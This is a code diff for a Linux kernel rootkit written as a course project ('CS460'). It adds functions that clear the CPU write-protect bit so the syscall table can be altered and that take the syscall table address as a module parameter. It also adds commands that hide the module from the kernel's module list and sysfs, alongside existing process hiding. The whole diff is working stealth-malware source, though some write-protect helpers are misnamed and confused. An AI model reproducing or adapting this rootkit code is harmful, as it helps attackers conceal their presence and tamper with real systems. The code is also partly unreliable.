@@ -10,6 +10,7 @@
 #include <linux/string.h>
 #include <linux/syscalls.h>
 #include <linux/fcntl.h>
+#include <linux/kobject.h>
 
 #include "rootkit.h"
 
@@ -18,14 +19,25 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("thanomk2");
 MODULE_DESCRIPTION("CS460-project");
 
-#define PROCFS_NAME "CS460"
 
+
+#define PROCFS_NAME "CS460"
+#define _DEBUG_
+
+static int get_syscall_table(void);
 
 static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, loff_t *data);
 static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t count, loff_t *data);
+
 static int parse_input(char *commands);
 static int hide_process(int pid);
-static int get_syscall_table(char *System_map_name);
+
+static void enable_write_protect(void);
+static void disable_write_protect(void);
+
+static int hide_self(void);
+static int unhide_self(void);
+
 // proc file pointers
 static struct proc_dir_entry *proc_dir;
 static struct proc_dir_entry *proc_dir_entry;
@@ -37,7 +49,11 @@ static spinlock_t lock;
 static int is_rootkit_hidden;
 
 // Syscall table pointers
-static unsigned long long syscall_table;
+static unsigned long long syscall_table_pointer;
+
+// Module argument
+static char* sys_call_table_addr_input;
+module_param(sys_call_table_addr_input, charp, 0);
 
 
 // Create new process_info struct
@@ -59,6 +75,31 @@ struct file_operations procFile_fops = {
 
 // Create kernel list
 LIST_HEAD(procList);
+LIST_HEAD(moduleList);
+
+/* This two functions deal with the writable bit in cpu that prevent the syscall_table \
+	tampering
+*/
+static void enable_write_protect(void){
+
+		// we need to stop kernel to preemp these functions
+		preempt_disable();
+
+		barrier();
+
+		// writable protect = 16th bit
+        write_cr0(read_cr0() & (~ 0x10000));
+}
+
+
+static void disable_write_protect(void){
+
+		preempt_enable();
+
+		barrier();
+
+        write_cr0(read_cr0() | 0x10000);
+}
 
 
 /* Idea from
@@ -70,18 +111,22 @@ LIST_HEAD(procList);
 
 	This function will return the address of syscall_table from the given \
 	System.map-$(uname -r). In this version, we assume that the attacker will
-	execute that command and insert it here.
+	execute that install shellscript. 
+
+	Note: We still have to disable the write-protection bit as well.
 
 */
-static int get_syscall_table(char *System_map_name){
+static int get_syscall_table(void){
+	
+	// Should use kstrtoull() instead, but this deprecated function is cleaner
+	// since we don't have to malloc new var.
+	if(  (syscall_table_pointer = simple_strtoull(sys_call_table_addr_input, NULL, 16)) ){
 
-	unsigned long long *tmp = (unsigned long long*)kmalloc(sizeof(unsigned long long), GFP_KERNEL);
+		pr_info("get syscall_table successfull\n Disabling write-protection...");
 
-	if(0 == kstrtoull(System_map_name, 16, tmp)){
+		enable_write_protect();
 
-		syscall_table = (unsigned long long*)tmp;
-
-		pr_info("get syscall_table successfull");
+		disable_write_protect();
 
 		return 0;	
 	}
@@ -91,6 +136,44 @@ static int get_syscall_table(char *System_map_name){
 	return -EINVAL;	
 }
 
+static struct kobject backup_module;
+
+static int hide_self(void){
+
+	if(!is_rootkit_hidden){
+
+		// Store previous module list_head to restore later
+		moduleList = *(THIS_MODULE->list.prev);
+
+		// Backup this model kernel_object
+		backup_module = THIS_MODULE->mkobj.kobj;
+
+		list_del_init(&(THIS_MODULE->list));
+
+		kobject_del(&(THIS_MODULE->mkobj.kobj));
+
+		is_rootkit_hidden = 1;
+	}
+
+	return 0;
+}
+
+static int unhide_self(void){
+
+	int ret;
+
+	if(is_rootkit_hidden){
+
+		list_add( &(THIS_MODULE->list), &moduleList);
+
+		ret = kobject_add(&backup_module, NULL, "rootkit");
+
+		is_rootkit_hidden = 0;
+
+	}
+
+	return 0;
+}
 
 
 static int hide_process(int pid){
@@ -114,7 +197,7 @@ static int parse_input(char *commands){
 	int pid;
 	
 
-	if(strcmp(commands, "hide") == 0){
+	if(strcmp(commands, "pid") == 0){
 
 		// skip space
 		commands = strsep(&commands, " ");
@@ -129,9 +212,21 @@ static int parse_input(char *commands){
 			hide_process(pid);
 		}
 	}
+	else if( strcmp(commands, "hide") == 0 ){
+
+		hide_self();
+	}
+	else if( strcmp(commands, "unhide") == 0 ){
+		
+		unhide_self();
+	}
 	else{
-		pr_info("this.");
-		get_syscall_table("ffffffff81a001c0");
+
+		#ifdef _DEBUG_
+
+		pr_info("Unknow command.");
+
+		#endif /*_DEBUG_*/
 	}
 
 	return 0;
@@ -236,6 +331,8 @@ int __init mp1_init(void)
     spin_lock_init(&lock);
 
     initialize_var();
+
+	get_syscall_table();
 
     pr_alert("MP1 MODULE LOADED\n");
 
